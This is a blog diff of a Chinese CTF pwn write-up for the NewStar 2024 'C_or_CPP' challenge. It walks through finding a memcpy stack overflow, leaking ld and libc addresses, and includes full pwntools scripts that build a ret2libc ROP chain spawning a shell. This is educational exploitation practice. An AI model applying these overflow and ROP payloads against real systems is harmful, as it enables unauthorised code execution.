@@ -6,16 +6,46 @@
   
   <title>2024 NewStar w5 | Chxinen</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta property="og:type" content="article">
+  <meta name="description" content="W5C_or_CPP只开了NX  main函数就是一个目录加选择，其中溢出点可能在Strings_函数或是String函数  Strings_函数中cin没有长度限制  String函数中cin和memcpy都有嫌疑  先尝试覆盖Strings_函数吧 用puts泄露出libc偏移，然后ret2libc 没有pop rdi ret，必须先要泄露libc C++的cin的确是在堆段的，所以只能从St">
+<meta property="og:type" content="article">
 <meta property="og:title" content="2024 NewStar w5">
 <meta property="og:url" content="http://example.com/2024/11/14/w5/index.html">
 <meta property="og:site_name" content="Chxinen">
+<meta property="og:description" content="W5C_or_CPP只开了NX  main函数就是一个目录加选择，其中溢出点可能在Strings_函数或是String函数  Strings_函数中cin没有长度限制  String函数中cin和memcpy都有嫌疑  先尝试覆盖Strings_函数吧 用puts泄露出libc偏移，然后ret2libc 没有pop rdi ret，必须先要泄露libc C++的cin的确是在堆段的，所以只能从St">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/css/img/w5/1730075795339.png">
+<meta property="og:image" content="http://example.com/css/img/w5/1730076968855.png">
+<meta property="og:image" content="http://example.com/css/img/w5/1730077083181.png">
+<meta property="og:image" content="http://example.com/css/img/w5/1730077139770.png">
+<meta property="og:image" content="http://example.com/css/img/w5/1730078972299.png">
+<meta property="og:image" content="http://example.com/css/img/w5/1730118057840.png">
+<meta property="og:image" content="http://example.com/css/img/w5/1730120065420.png">
+<meta property="og:image" content="http://example.com/css/img/w5/1730120100804.png">
+<meta property="og:image" content="http://example.com/css/img/w5/1730121040259.png">
+<meta property="og:image" content="http://example.com/css/img/w5/1730121429796.png">
+<meta property="og:image" content="http://example.com/css/img/w5/1730189233810.png">
+<meta property="og:image" content="http://example.com/css/img/w5/1730189291415.png">
+<meta property="og:image" content="http://example.com/css/img/w5/1730190162456.png">
+<meta property="og:image" content="http://example.com/css/img/w5/1730189720864.png">
+<meta property="og:image" content="http://example.com/css/img/w5/1730275100610.png">
+<meta property="og:image" content="http://example.com/css/img/w5/1730277173822.png">
+<meta property="og:image" content="http://example.com/css/img/w5/1730277260733.png">
+<meta property="og:image" content="http://example.com/css/img/w5/1730275396357.png">
+<meta property="og:image" content="http://example.com/css/img/w5/1730276387699.png">
+<meta property="og:image" content="http://example.com/css/img/w5/1730278808761.png">
+<meta property="og:image" content="http://example.com/css/img/w5/1731897366400.png">
+<meta property="og:image" content="http://example.com/css/img/w5/1731897436364.png">
+<meta property="og:image" content="http://example.com/css/img/w5/1731900323242.png">
+<meta property="og:image" content="http://example.com/css/img/w5/1731900717696.png">
+<meta property="og:image" content="http://example.com/css/img/w5/1732001578009.png">
+<meta property="og:image" content="http://example.com/css/img/w5/1732002030504.png">
+<meta property="og:image" content="http://example.com/css/img/w5/1732003105028.png">
 <meta property="article:published_time" content="2024-11-14T11:48:22.000Z">
-<meta property="article:modified_time" content="2024-11-19T11:54:58.085Z">
+<meta property="article:modified_time" content="2024-11-19T13:20:52.063Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="CTF PWN">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/css/img/w5/1730075795339.png">
   
     <link rel="alternate" href="/atom.xml" title="Chxinen" type="application/atom+xml">
   
@@ -92,7 +122,83 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        
+        <h1 id="W5"><a href="#W5" class="headerlink" title="W5"></a>W5</h1><h2 id="C-or-CPP"><a href="#C-or-CPP" class="headerlink" title="C_or_CPP"></a>C_or_CPP</h2><p>只开了NX</p>
+<p><img src="/../css/img/w5/1730075795339.png"></p>
+<p>main函数就是一个目录加选择，其中溢出点可能在Strings_函数或是String函数</p>
+<p><img src="/../css/img/w5/1730076968855.png"></p>
+<p>Strings_函数中cin没有长度限制</p>
+<p><img src="/../css/img/w5/1730077083181.png"></p>
+<p>String函数中cin和memcpy都有嫌疑</p>
+<p><img src="/../css/img/w5/1730077139770.png"></p>
+<p>先尝试覆盖Strings_函数吧</p>
+<p>用puts泄露出libc偏移，然后ret2libc</p>
+<p>没有pop rdi ret，必须先要泄露libc</p>
+<p>C++的cin的确是在堆段的，所以只能从String函数的memcpy入手</p>
+<p><img src="/../css/img/w5/1730078972299.png"></p>
+<p>溢出点找到了</p>
+<p>接下来考虑该怎么泄露基地址</p>
+<p>ret前的寄存器值，rdi为0x7，调不了printf格式化字符串</p>
+<p><img src="/../css/img/w5/1730118057840.png"></p>
+<p>——————-在这里有个非常神奇的事情就是有的时候覆盖不到ret，迷惑——————————————————</p>
+<p><img src="/../css/img/w5/1730120065420.png"></p>
+<p><img src="/../css/img/w5/1730120100804.png">plt可以，b’12345678’可以，但0x40200c不行，ret(0x40201A)的也不行，这两都在.init，换了ret之后ret可显示</p>
+<p><img src="/../css/img/w5/1730121040259.png"></p>
+<p>别说是可执行段，就算不可执行，放栈上为什么不行？</p>
+<p><img src="/../css/img/w5/1730121429796.png"></p>
+<hr>
+<p>接着做</p>
+<p>如果返回read，就可以修改got表</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 5</span></span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x40</span> <span class="comment"># can&#x27;t use a</span></span><br><span class="line">pl += p64(puts_got + <span class="number">0x70</span>)</span><br><span class="line">pl += p64(read_addr)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../css/img/w5/1730189233810.png"></p>
+<p><img src="/../css/img/w5/1730189291415.png"></p>
+<p>如果我能把std::string::~string改成puts，然后v4输入got表地址，就能成功泄露了</p>
+<p><img src="/../css/img/w5/1730190162456.png"></p>
+<p>pwndbg&gt;got &#x3D;&gt; 0x408060</p>
+<p><img src="/../css/img/w5/1730189720864.png"></p>
+<p>—————————————————————-没合适的—————————————————————————–</p>
+<p>—————————————————————-利用cout—————————————————————————-</p>
+<p>偶然发现cout不人为赋值的话会一直输出</p>
+<p>从rsi开始输出0xfff字节，并且会把真实地址泄露出来</p>
+<p><img src="/../css/img/w5/1730275100610.png"></p>
+<p><img src="/../css/img/w5/1730277173822.png"></p>
+<p>但是程序崩溃了</p>
+<p><img src="/../css/img/w5/1730277260733.png"></p>
+<p><img src="/../css/img/w5/1730275396357.png"></p>
+<p>那就是传递了一个不合法的指针，进入该函数看一下</p>
+<p>我怎么去精准地控制那个malloc出来的位置啊……不能吧</p>
+<p>正常(rdi &#x3D; [rbp-0x90])</p>
+<p><img src="/../css/img/w5/1730276387699.png"></p>
+<p>异常</p>
+<p><img src="/../css/img/w5/1730278808761.png"></p>
+<p>下面代码可以泄露__libc_start_main的地址，但是没办法成功free</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">printf_addr = <span class="number">0x4029B6</span></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">ret_addr = <span class="number">0x4032D6</span></span><br><span class="line"><span class="comment"># read_addr = 0x4029B6</span></span><br><span class="line">back_addr = <span class="number">0x4029cc</span></span><br><span class="line">main_addr = <span class="number">0x4030C9</span></span><br><span class="line"><span class="comment"># read_addr = 0x4029CC # min range</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># leak1 for rbp </span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Please choose an option: &#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Address of c_string: 0x&#x27;</span>)</span><br><span class="line">buf_stack_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">rbp_addr = buf_stack_addr  + <span class="number">0x68</span> * <span class="number">2</span> - <span class="number">0x48</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;buf_stack_addr: &#x27;</span>, <span class="built_in">hex</span>(buf_stack_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;rbp_addr: &#x27;</span>, <span class="built_in">hex</span>(rbp_addr))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;C++ String input: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;C String input: &#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;b&#x27;</span> * <span class="number">0x50</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;C++ String: a\n&#x27;</span>)</span><br><span class="line"><span class="comment"># p.recvuntil(b&#x27;C String: b\n&#x27;)</span></span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak2 for libc</span></span><br><span class="line"><span class="comment"># pl = b&#x27;a&#x27; * 0x40</span></span><br><span class="line">pl = <span class="string">b&#x27;\x01&#x27;</span> * <span class="number">8</span></span><br><span class="line">pl += <span class="string">b&#x27;\x11&#x27;</span> * <span class="number">8</span></span><br><span class="line">pl += <span class="string">b&#x27;\x02&#x27;</span> * <span class="number">8</span></span><br><span class="line">pl += <span class="string">b&#x27;\x22&#x27;</span> * <span class="number">8</span></span><br><span class="line">pl += <span class="string">b&#x27;\x33&#x27;</span> * <span class="number">8</span></span><br><span class="line">pl += <span class="string">b&#x27;\x44&#x27;</span> * <span class="number">8</span></span><br><span class="line">pl += <span class="string">b&#x27;\x55&#x27;</span> * <span class="number">8</span></span><br><span class="line">pl += p64(rbp_addr + <span class="number">0x70</span>) <span class="comment"># [position 1] from here start to cout.</span></span><br><span class="line">pl += p64(rbp_addr + <span class="number">0x70</span>) <span class="comment"># - 0x48 [position 2] for cout function.</span></span><br><span class="line"><span class="comment"># pl += p64(0x4080e8 + 0x70)</span></span><br><span class="line">pl += p64(back_addr)</span><br><span class="line">pl = pl.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">pl += p64(<span class="number">0</span>)</span><br><span class="line">pl += p64(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Please choose an option: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Try to say something: &#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(pl)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;C++ String: &#x27;</span>)</span><br><span class="line"><span class="comment"># p.recvline()</span></span><br><span class="line">p.recv(<span class="number">0x90</span>)</span><br><span class="line">start_main_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">128</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;__start_main_addr: &#x27;</span>, <span class="built_in">hex</span>(start_main_addr))</span><br><span class="line">p.recv(<span class="number">0xfff</span> * <span class="number">2</span> + <span class="number">0x802</span> - <span class="number">0x90</span> - <span class="number">6</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;C String: &#x27;</span>)</span><br><span class="line">p.recvline()</span><br></pre></td></tr></table></figure>
+
+<p>需要被free的指针是<code>[position 1]</code>里的内容，如果<code>[position 1]</code>填0，可以成功被free（相当于free(0)），但没办法输出栈上内容了</p>
+<p>能不能去free一个栈地址，或者说，指针需要满足什么条件才能被free，必须被malloc，在chunk里吗？</p>
+<h3 id="正解"><a href="#正解" class="headerlink" title="正解"></a>正解</h3><p>String函数的memcpy为溢出点</p>
+<p><img src="/../css/img/w5/1731897366400.png"></p>
+<p>Strings_函数中read和printf(“%s”)泄露libc， <code>printf(&quot;%s&quot;)</code> 会一直输出直到遇到 <code>\x00</code> </p>
+<p><img src="/../css/img/w5/1731897436364.png"></p>
+<p>之前是有过这个想法的，但是printf泄露一直不成功，应该是不能用sendline</p>
+<p>泄露出的地址处于<code>ld-linux-x86-64.so.2</code>范围，并不属于libc</p>
+<p>可能是偏移问题，patchelf一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter ./ld-linux-x86-64.so.2 ./C</span><br><span class="line">patchelf --replace-needed libc.so.6 ./libc.so.6 ./C</span><br><span class="line">patchelf --replace-needed libstdc++.so.6 ./libstdc++.so ./C</span><br><span class="line">patchelf --replace-needed libgcc_s.so.1 ./libgcc_s.so.1 ./C</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../css/img/w5/1731900323242.png"></p>
+<p>换libm没反应，然后第一个没给这个文件</p>
+<p><img src="/../css/img/w5/1731900717696.png"></p>
+<p>但ld也有对应的可执行块和pop_rdi等gadget（没有函数），再用文件的put函数得到libc地址，再得到system，然后回到main再次溢出到system</p>
+<p><img src="/../css/img/w5/1732001578009.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 远程通本地不通，可能还是偏移问题</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p64</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> u64</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./C_or_CPP&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">44081</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./C_or_CPP&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">put_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># leak1 for rbp because of leave_ret</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Please choose an option: &#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Address of c_string: 0x&#x27;</span>)</span><br><span class="line">buf_stack_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;buf_stack_addr: &#x27;</span>, <span class="built_in">hex</span>(buf_stack_addr))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;C++ String input: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;C String input: &#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">b&#x27;b&#x27;</span> * <span class="number">0x50</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;C++ String: a\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;C String: &#x27;</span>)</span><br><span class="line">p.recv(<span class="number">0x50</span>)</span><br><span class="line">ld_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3a040</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ld_addr: &#x27;</span>, <span class="built_in">hex</span>(ld_addr))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = ld_addr + <span class="number">0x351e</span> </span><br><span class="line">ret_addr = ld_addr + <span class="number">0x2128</span></span><br><span class="line"></span><br><span class="line">pl2 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x40</span> + <span class="number">8</span>)</span><br><span class="line">pl2 += p64(pop_rdi_ret)</span><br><span class="line">pl2 += p64(puts_got) </span><br><span class="line">pl2 += p64(put_plt)</span><br><span class="line">pl2 += p64(<span class="number">0x402E4A</span>) <span class="comment"># String或是main都行</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Please choose an option: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Try to say something: &#x27;</span>)</span><br><span class="line">p.sendline(pl2)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr: &#x27;</span>, <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">p.recv(<span class="number">1</span>)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x2a3e5</span></span><br><span class="line">ret_addr = libc_base + <span class="number">0x29139</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base: &#x27;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system_addr: &#x27;</span>, <span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="comment"># system</span></span><br><span class="line">pl3 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x40</span> + <span class="number">8</span>)</span><br><span class="line">pl3 += p64(ret_addr)</span><br><span class="line">pl3 += p64(pop_rdi_ret)</span><br><span class="line">pl3 += p64(bin_sh_addr) </span><br><span class="line">pl3 += p64(system_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recvuntil(b&#x27;Please choose an option: &#x27;)</span></span><br><span class="line"><span class="comment"># p.sendline(b&#x27;5&#x27;)</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Try to say something: &#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(pl3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>关键就是<code>printf</code>泄露不能用<code>sendline</code></p>
+<h4 id="问题1"><a href="#问题1" class="headerlink" title="问题1"></a>问题1</h4><p>本地调试溢出到<code>system</code>时，<code>ret</code>内容并不是<code>system</code>地址，但<code>/bin/sh</code>地址是在栈中的，神奇</p>
+<p><img src="/../css/img/w5/1732002030504.png"></p>
+<p><code>memcpy</code>的时候，在堆中是正确的，但是到栈就错误了，pl并没有超过0x100的长度限制</p>
+<p><img src="/../css/img/w5/1732003105028.png"></p>
+<h4 id="问题2"><a href="#问题2" class="headerlink" title="问题2"></a>问题2</h4><p>官方wp直接<code>printf</code>出了libc的地址，迷惑……如果是环境问题，那为什么用ld地址能跑通呢？ld的偏移一样但libc的不一样？这会是导致问题1的原因吗？</p>
+
       
     </div>
     <footer class="article-footer">
